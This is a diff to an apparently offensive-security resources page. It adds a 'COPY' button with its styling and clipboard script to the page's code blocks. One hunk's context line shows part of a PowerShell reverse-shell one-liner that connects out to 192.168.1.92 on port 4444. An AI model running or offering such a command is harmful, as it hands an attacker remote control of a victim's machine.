@@ -39,7 +39,10 @@ body{background:var(--bg);color:var(--fg);font-family:'Inter',sans-serif;line-he
 .resource-list a:hover{text-decoration:underline;}
 .resource-list .desc{font-size:0.8rem;color:var(--dim);margin-top:0.3rem;}
     
-.code-block{background:var(--bg3);border:1px solid var(--border);padding:1rem;margin:1rem 0;font-family:'Space Mono',monospace;font-size:0.75rem;color:var(--fg);overflow-x:auto;white-space:pre-wrap;word-break:break-all;}
+.code-block{background:var(--bg3);border:1px solid var(--border);padding:1rem;margin:1rem 0;font-family:'Space Mono',monospace;font-size:0.75rem;color:var(--fg);overflow-x:auto;white-space:pre-wrap;word-break:break-all;position:relative;}
+.copy-btn{position:absolute;top:0.5rem;right:0.5rem;background:var(--border);color:var(--dim);border:1px solid var(--dim);padding:0.2rem 0.5rem;font-family:'Space Mono',monospace;font-size:0.65rem;cursor:pointer;transition:all 0.2s;}
+.copy-btn:hover{background:var(--neon);color:var(--bg);border-color:var(--neon);}
+.copy-btn.copied{background:var(--green);color:var(--bg);border-color:var(--green);}
     .note{background:rgba(255,170,0,0.05);border-left:3px solid var(--amber);padding:1rem;margin:1rem 0;font-size:0.85rem;color:var(--fg);}
     h3{font-family:'Space Mono',monospace;font-size:0.9rem;color:var(--accent);margin:1.5rem 0 0.5rem;text-transform:uppercase;letter-spacing:0.05em;}
     .note::before{content:'// NOTE: ';color:var(--amber);font-weight:700;}
@@ -452,6 +455,27 @@ powershell -c "$c=New-Object Net.Sockets.TCPClient('192.168.1.92',4444);$s=$c.Ge
   // 22ND SURVEY DIVISION // RESOURCES // FREE FOR SELF-STUDY //<br>
   Tools and source code require purchase. Theory and methodology are free.
 </div>
+
+<script>
+// Add copy buttons to all code blocks
+document.querySelectorAll('.code-block').forEach(block => {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.textContent = 'COPY';
+  btn.onclick = function() {
+    const text = block.innerText.replace(/COPY$/, '').trim();
+    navigator.clipboard.writeText(text).then(() => {
+      btn.textContent = 'COPIED!';
+      btn.classList.add('copied');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 2000);
+    });
+  };
+  block.appendChild(btn);
+});
+</script>
 
 </body>
 </html>
